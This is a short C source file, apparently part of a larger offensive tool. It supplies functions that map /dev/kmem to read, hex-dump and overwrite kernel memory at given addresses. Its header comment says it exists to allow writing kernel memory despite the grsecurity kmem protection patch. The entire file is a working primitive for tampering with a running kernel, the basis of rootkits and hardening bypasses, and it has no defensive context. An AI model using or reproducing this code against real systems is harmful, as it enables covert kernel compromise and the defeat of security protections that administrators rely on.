/*
**
** kmem.c
**
** Made by (Guillaume PELAT)
** Login   <pelat_g@epita.fr>
**
** kmem_mmap operations.
**	Allow writing to kmem even with grsecurity kmem patch applied
*/

#include <assert.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "symbol.h"
#include "kmem.h"

#define OFFSET 0xc0000000

int open_kmem(void)
{
    int fd = open(KMEM_PATH, O_RDWR);
    if (fd < 0) {
        printf("Cannot open %s\n", KMEM_PATH);
        exit(1);
    }
    return fd;
}

void    dump_data(void *ptr, unsigned int len)
{
    unsigned char *p = ptr;
    while (len--)
    	printf("%.2x ", *p++);
    printf("\n");
}

void    read_kmem(int fd, void *addr, void *buf, unsigned int len)
{
    char *mem;
    int  offset;

    offset = PTR_POS(addr-OFFSET) - (PTR_POS(addr-OFFSET) & ~4095);
    mem = mmap(0, offset+len, PROT_READ, MAP_SHARED, fd, (PTR_POS(addr-OFFSET) & ~4095));
    if (mem == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    dump_data(mem+offset, len);
    memcpy(buf, mem+offset, len);
    munmap(mem, offset+len);
}

void    write_kmem(int fd, void *addr, void *buf, unsigned int len)
{
    int offset = PTR_POS(addr-OFFSET) - (PTR_POS(addr-OFFSET) & ~4095);
    char *mem = mmap(0, offset+len, PROT_WRITE, MAP_SHARED, fd, (PTR_POS(addr-OFFSET) & ~4095));
    if (mem == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    memcpy(mem+offset, buf, len);
    msync(mem, offset+len, MS_SYNC);
    munmap(mem, offset+len);
}
